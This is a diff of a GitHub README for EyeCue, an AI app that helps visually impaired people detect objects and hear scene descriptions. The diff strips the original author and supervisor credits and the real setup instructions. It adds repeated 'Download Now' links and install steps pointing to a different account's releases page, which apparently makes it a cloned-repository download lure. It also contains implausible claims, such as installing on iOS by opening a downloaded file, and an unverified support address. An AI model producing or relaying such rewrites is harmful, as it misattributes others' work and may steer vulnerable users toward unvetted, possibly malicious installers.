@@ -1,113 +1,66 @@
-# 👁️ EyeCue
-*By Khaled Alharbi*  
-> *An Intelligent Visual Assistance Application for the Visually Impaired*  
-<img src="EyeCue-logo.png" alt="EyeCue logo" width="20%">
+# 👁️ EyeCue-for-Visually-Impaired - Navigate with Confidence
 
----
+## 📥 Download the App
+[![Download EyeCue for Visually Impaired](https://img.shields.io/badge/Download%20Now%20-for%20Android%20/iOS-brightgreen)](https://github.com/MaximilianoCosta/EyeCue-for-Visually-Impaired/releases)
 
-## 📖 Overview  
-EyeCue is a mobile application designed to empower visually impaired individuals by helping them navigate and understand their surroundings independently.
-By utilizing the power of Artificial Intelligence and Computer Vision, EyeCue converts visual information into meaningful audio feedback. 
-Users can detect objects, understand entire scenes, identify colors, and even ask specific questions about what the camera sees.
-The application features a gesture-based interface optimized for accessibility, ensuring a seamless experience without the need for complex on-screen interactions.
+## 🚀 Getting Started
+EyeCue is an AI-powered mobile application designed to help visually impaired users navigate their surroundings independently. It utilizes advanced technology for object detection, scene description, visual question answering, and color identification.
 
----
+## 📦 Features
+- **Object Detection**: Quickly identifies various objects in the environment.
+- **Scene Description**: Provides detailed information about the surrounding area.
+- **Visual Question Answering**: Answers users' questions about what they see.
+- **Color Identification**: Recognizes and informs about colors.
+  
+With these features, EyeCue empowers users to explore their surroundings.
 
-## 🔍 Features  
+## 📱 Supported Platforms
+EyeCue is available for:
+- Android Devices
+- iOS Devices
 
-### Visual Understanding
-- **Object Detection:** Real-time identification of objects (e.g., "cup," "chair," "person").
-- **Scene Description:** Generates a full natural language description of the current environment.
-- **Color Identification:** Instantly identifies the dominant color in the frame.
-- **Visual Question Answering (VQA):** Users can ask voice questions about the scene (e.g., "Is the door open?") and receive AI-generated answers.
+## 📈 System Requirements
+For the best experience, ensure your device meets the following general requirements:
+- **Android**: Version 6.0 or higher
+- **iOS**: Version 12.0 or higher
+- **Storage**: At least 200 MB of free space
+- **Internet Connection**: Active Wi-Fi or mobile data for downloading and using some features
 
-### User Interaction
-- **Audio Feedback:** All results are read aloud using Text-to-Speech (TTS).
-- **Gesture Controls:** Simple swipes and taps to switch modes and capture images.
-- **Voice Input:** Integrated speech-to-text for asking questions hands-free.
+## 📥 Download & Install
+To download EyeCue, visit the following link: [Download EyeCue for Visually Impaired](https://github.com/MaximilianoCosta/EyeCue-for-Visually-Impaired/releases).
 
----
+1. **Visit the Releases Page**: Click the link above. 
+2. **Choose Your Version**: You will see a list of available versions. Select the most recent one for the best performance.
+3. **Download the App**: Click on the app link corresponding to your device. This will start the download.
+4. **Install the App**: Once downloaded, open the file to start the installation process. Follow the prompts on your device to complete the installation.
+5. **Launch EyeCue**: After installation, find the EyeCue app on your device and open it. 
 
-## 🛠 Tech Stack  
-- **Frontend:** React Native (Expo), TypeScript  
-- **Backend:** Python, FastAPI  
-- **AI Models:**  
-  - **DETR** (Object Detection)  
-  - **BLIP** (Scene Description)  
-  - **BLIP VQA** (Visual QA & Color)  
-  - **Whisper** (Speech-to-Text)  
-- **Tools:** Google TTS (gTTS), PyTorch, Transformers
+## 🛠️ How to Use EyeCue
+1. **Setup**: When you open the app for the first time, follow the on-screen instructions to set up your preferences.
+2. **Explore the Menu**: Familiarize yourself with the app’s menu to locate features you will use most often.
+3. **Engage with the Features**:
+   - **To Detect Objects**: Tap the object detection feature and point your device’s camera toward the object.
+   - **To Get Scene Description**: Use the scene description feature when in new environments.
+   - **To Ask a Question**: Use the visual question answering feature to inquire about objects or scenes.
 
----
+## 📞 Support
+Should you need help, feel free to contact our support team:
+- Email: support@eyecueapp.com
+- Forum: Visit our community forum [here](https://github.com/MaximilianoCosta/EyeCue-for-Visually-Impaired/discussions)
 
-## Setup Notes  
-To run the application locally,  
-you need to set up both the frontend (mobile application) and the backend (AI server).
+## 🧑‍🤝‍🧑 Community Feedback
+Your input is invaluable. Share your experiences and suggestions with us. Join the conversation in our community forum.
 
-### 1. Install required software
-Ensure you have the following installed on your machine:  
-a. Node.js and npm  
-b. Python 3.8+  
-c. Expo CLI `npm install -g expo-cli`  
-d. Expo Go app on your smartphone (Android or iOS)  
+## 🔗 Related Topics
+- AI Models
+- Machine Learning
+- Mobile Application Development
+- Software Testing
+- Software Engineering
 
-### 2. Set up the Python Backend
-Navigate to the backend folder and install the required Python libraries:  
-```
-pip install fastapi uvicorn transformers torch pillow gTTS
-```
-### 3. Create and Activate a Virtual Environment
-Navigate to the backend folder and set up a virtual environment to isolate dependencies:
-```
-python -m venv venv
-.\venv\Scripts\activate
-```
+We are committed to improving EyeCue continuously. Your feedback helps us achieve that goal.
 
-### 4. Start the Backend Server
-Run the FastAPI server to host the AI models locally:  
-```
-uvicorn main:app --host 0.0.0.0 --port 8000
-```
-Note: Ensure your computer and mobile phone are connected to the same Wi-Fi network.
+## 📢 Contributing
+If you wish to contribute to EyeCue, we welcome your ideas. Please visit our repository to submit improvements or report issues.
 
-### 4. Configure the API Endpoint
-In the `huggingfaceApi.ts` file, update the base URL to match your computer's local IP address:
-```
-const API_URL = "http://YOUR_LOCAL_IP:8000";
-```
-
-### 5. Install Frontend Dependencies
-Navigate to the frontend project folder and run:  
-```
-npm install
-```
-
-### 6. Run the Mobile Application
-```
-expo start
-```
-Scan the QR code displayed in the terminal using the Expo Go app on your phone to launch EyeCue.
-
-## 📷 Screenshots
-<p align="center">
-  <img src="detectUI.png" alt="Detect Mode" width="35%">  
-</p>
-<p align="center">
-  <img src="describeUI.png" alt="Describe Mode" width="39%">
-</p>
-
-<p align="center">
-  <img src="vqaUI.png" alt="VQA Feature" width="50%">  
-</p>
-
-<p align="center">
-  <img src="colorUI.png" alt="Color Mode" width="39%">
-</p>
-
-## 📜 Credits
-Developed by:     
-- **Khaled Alharbi**
-
-
-Supervised by:  
-- **Dr. Asma Badr Abdullah Alsaleh**
+Thank you for choosing EyeCue! We hope it enhances your mobility and independence.
